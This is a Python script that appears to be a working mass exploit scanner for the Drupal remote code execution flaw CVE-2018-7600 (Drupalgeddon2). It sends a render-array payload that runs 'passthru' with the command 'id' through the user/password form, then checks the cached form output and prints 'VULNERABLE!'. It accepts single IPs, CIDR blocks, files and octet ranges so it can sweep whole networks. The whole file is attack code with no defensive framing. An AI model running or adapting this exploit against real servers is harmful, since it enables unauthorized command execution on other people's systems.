#written by fyraiga 
#POC adapted from FireFart CVE-2018-7600

#import here
import requests
import re
import sys
import ipaddress
import argparse
import itertools

#functions
def exploit(url_target):
    send_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'id', 'name[#type]':'markup'}
    send_data = {'form_id':'user_pass', '_triggering_element_name':'name'}
    try:
        print(url_target, end=' ** ')
        r = requests.post(url_target, data=send_data, params=send_params, timeout=3)
    except requests.exceptions.Timeout:
        print("ERROR: Server did not reply in time (Timeout)", end=' **\n')
        return
    except requests.exceptions.ConnectionError:
        print("ERROR: Server seems to be down", end=' **\n')
        return
    except requests.exceptions.HTTPError:
        print("ERROR: 4xx/5xx", end=' **\n')
        return
    except Exception as e:
        print(e)
        print("ERROR: Unexpected Error", end=' **\n')
        sys.exit()
    else: 
        print("OK: Alive", end=' ** ')
    m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
    if m:
        print("OK: Drupal Config", end=' ** ')
        found = m.group(1)
        send_params = {'q':'file/ajax/name/#value/' + found}
        send_data = {'form_build_id':found}
        r = requests.post(url_target, data=send_data, params=send_params)
        r.encoding = 'ISO-8859-1'
        out = r.text.split("[{")[0].strip()
        if out == "":
            print("Nothing to see here")
        else: 
            print("VULNERABLE! ***************************************** ")
    else:
        print("ABORT: Not Drupal?", end=' **\n')

#main here
def main():
    parser = argparse.ArgumentParser(allow_abbrev=False)
    parser.add_argument('-f', metavar="file", help="Retrieve IP Addresses from a file (1 per line)")
    parser.add_argument('-i', metavar="ip/cidr", help="Single IP Address (supports CIDR range)")
    parser.add_argument('-m', metavar="multiple", help="Multiple IP Adddress e.g. 192.168.0.1,192.168.0.2,192.168.0.3")
    parser.add_argument('-r', metavar="range", help="IP Range e.g. 192.168.1-2.0-255 (nmap format)")
    hostlist = []
    if len(sys.argv) != 3:
        parser.print_usage()
        sys.exit()
    args, u = parser.parse_known_args()
    if args.f != None:
        try:
            file = open(args.f, "r")
            for line in file:
                exploit("http://"+str(ipaddress.ip_address(line.strip())))
        except FileNotFoundError:
            print("Unable to locate file. Check file path.")
            sys.exit()
        except ValueError:
            print("Invalid value in file. Ensure only IPv4 addresses exist!")
            sys.exit()
        except Exception as e:
            print("Unexpected Error")
            sys.exit()
    #IP Address/CIDR
    elif args.i != None:
        net = ipaddress.ip_network(args.i.strip(), strict=False)
        try:
            for host in net.hosts():
                hostlist.append(host)
                exploit("http://"+str(host))
            if len(hostlist) == 0:
                exploit("http://"+str(ipaddress.ip_address(args.i.strip())))
        except ValueError:
            print("Invalid Input. Only IPv4 & valid CIDR addresses are accepted.")
            sys.exit()
        except Exception as e:
            print("Unexpected Error")
            sys.exit()
    #Multiple IP (separated w commas)
    elif args.m != None:
        hostlist = args.m.split(",")
        try:
            for host in hostlist:
                exploit("http://"+str(host.strip()))
        except ValueError:
            print("Invalid Input. Only IPv4 addresses are accepted.")
            sys.exit()
    #IP Range (start-end)
    elif args.r != None:
        rangelist = []
        try:
            raw_octets = args.r.split(".")
            octets = [x.strip().split("-") for x in raw_octets]
            octet_range = [range(int(x[0]), int(x[1])+1) if len(x) == 2 else x for x in octets]
            for x in itertools.product(*octet_range):
                rangelist.append('.'.join(map(str,x)))
            for addr in rangelist:
                exploit("http://"+str(addr))
        except ValueError:
            print("Invalid Input. Only IPv4 ranges are accepted.")
            sys.exit()
        except Exception as e:
            print("Unexpected Error")
            sys.exit()
    #Unrecognised arguments
    else:
        parser.print_usage()
        sys.exit()
    #exploit(target, filepath)
    sys.exit()

#ifmain here
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print (" -- Ctrl+C caught. Terminating program.")
    except Exception:
        sys.exit()
